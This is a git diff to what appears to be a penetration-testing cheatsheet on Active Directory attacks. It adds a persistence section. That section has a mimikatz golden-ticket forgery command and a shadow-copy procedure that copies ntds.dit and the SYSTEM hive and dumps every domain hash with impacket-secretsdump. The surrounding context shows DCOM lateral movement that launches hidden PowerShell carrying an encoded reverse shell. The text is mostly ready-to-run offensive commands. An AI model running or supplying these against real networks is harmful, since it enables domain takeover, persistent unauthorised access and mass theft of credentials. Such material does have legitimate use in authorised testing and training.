@@ -33,7 +33,9 @@ Expect Spanglish, this is a cheatsheet.
    - [Using Legacy Tools, Default Win Tools and Sysinternals tools](#using-legacy-tools-default-windows-tools-and-sysinternals-tools)
    - [Using PowerView](#using-powerview)
    - [Automated enumeration with Bloodhound](#automated-enumeration-through-bloodhound-and-its-data-collectors)
-- [AD LAteral Movement 101](#lateral-movement-in-ad-101)
+- [Attacks to AD Authentication](to-do)	
+- [AD Lateral Movement 101](#lateral-movement-in-ad-101)
+- [Persistence in AD 101](#persistence-in-ad-101)
 - [Port Scanning](#port-scanning)
 - [Web Directory Scanning (and related)](#web-directory-scanning-and-related)
 - [DNS Enumeration](#dns-enumeration)
@@ -923,6 +925,34 @@ $dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Appl
 # Use the ExecuteShellCommand method to execute commands (accpets 4 parameter: Command, Directory, Parameters, and WindowState)
 $dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <base64_encoded_reverse_shell>","7")
 ```
+
+[Back to top](#index)
+
+
+### Persistence in AD 101
+
+#### Golden Ticket
+To use the golden ticket (any forged ticket), NTLM auth must be avoided by using hostname instead of IP_ADDRESS.
+
+```
+# Using mimikatz.
+kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_NTLM_hash> /ptt
+misc::cmd 
+```
+
+#### Shadow Copy
+
+Using *vshadow.exe*
+```
+vshadow.exe -nw -p  C: # -nw to disable writers to speed up the process. 
+# Get the Shadow Copy Device Name (something like:  \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2)
+copy <shadow_copy_device_name>\windows\ntds\ntds.dit C:\ntds.dit.bak # Extract/copy the ntds.dit database from recently copied volume
+reg.exe save hklm\system c:\system.bak # Save the system hive
+# After transfering files to Kali 
+impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
+```
+
+[Back to top](#index)
 
 
 ## Port Scanning
